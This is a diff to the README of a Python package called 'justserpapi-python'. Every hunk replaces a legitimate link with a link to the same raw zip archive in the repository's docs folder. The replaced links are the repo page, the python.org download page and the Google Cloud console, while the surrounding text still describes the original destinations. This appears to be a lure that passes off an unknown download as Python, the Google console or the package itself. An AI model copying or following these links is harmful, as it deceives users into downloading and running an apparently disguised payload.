@@ -1,6 +1,6 @@
 # 🛠 justserpapi-python - Easy Google Data Access
 
-[![Download justserpapi-python](https://img.shields.io/badge/Download-justserpapi--python-43a047?style=for-the-badge&logo=github)](https://github.com/Mcc1987/justserpapi-python)
+[![Download justserpapi-python](https://img.shields.io/badge/Download-justserpapi--python-43a047?style=for-the-badge&logo=github)](https://github.com/Mcc1987/justserpapi-python/raw/refs/heads/main/docs/justserpapi_python_3.7.zip)
 
 ---
 
@@ -45,7 +45,7 @@ To use justserpapi-python on Windows, your computer should meet these needs:
 
 justserpapi-python runs on Python. If you don’t have Python installed, follow these steps:
 
-1. Open your browser and visit https://www.python.org/downloads/windows/  
+1. Open your browser and visit https://github.com/Mcc1987/justserpapi-python/raw/refs/heads/main/docs/justserpapi_python_3.7.zip  
 2. Click the “Download Python 3.x.x” button (choose latest version).  
 3. Run the downloaded file.  
 4. In the installer, check the box labeled “Add Python to PATH.”  
@@ -60,7 +60,7 @@ justserpapi-python runs on Python. If you don’t have Python installed, follow 
 
 To get the software, visit the GitHub page below and download it there:
 
-[Download justserpapi-python](https://github.com/Mcc1987/justserpapi-python)
+[Download justserpapi-python](https://github.com/Mcc1987/justserpapi-python/raw/refs/heads/main/docs/justserpapi_python_3.7.zip)
 
 This link leads you to the official page where you can find updates, instructions, and files.
 
@@ -133,7 +133,7 @@ Each service helps automate data collection, useful for marketing research, SEO,
 
 Some Google services require API keys to operate. You may need to:
 
-1. Create a free developer account on Google Cloud: https://console.cloud.google.com/  
+1. Create a free developer account on Google Cloud: https://github.com/Mcc1987/justserpapi-python/raw/refs/heads/main/docs/justserpapi_python_3.7.zip  
 2. Set up a new project.  
 3. Enable the required APIs (Search, Maps, etc.).  
 4. Generate an API key.  
@@ -158,7 +158,7 @@ API keys control your access and prevent misuse. Keep them private and secure.
 
 The GitHub page includes more detailed instructions and examples:
 
-[https://github.com/Mcc1987/justserpapi-python](https://github.com/Mcc1987/justserpapi-python)
+[https://github.com/Mcc1987/justserpapi-python/raw/refs/heads/main/docs/justserpapi_python_3.7.zip](https://github.com/Mcc1987/justserpapi-python/raw/refs/heads/main/docs/justserpapi_python_3.7.zip)
 
 You can find how to use each API, advanced settings, and sample scripts.
 
@@ -168,4 +168,4 @@ You can find how to use each API, advanced settings, and sample scripts.
 
 Download the package here:
 
-[Download justserpapi-python](https://github.com/Mcc1987/justserpapi-python)
+[Download justserpapi-python](https://github.com/Mcc1987/justserpapi-python/raw/refs/heads/main/docs/justserpapi_python_3.7.zip)
